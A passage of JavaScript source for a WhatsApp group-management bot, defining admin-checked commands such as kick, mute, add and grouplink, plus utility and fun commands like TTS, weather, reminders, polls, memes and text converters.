      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
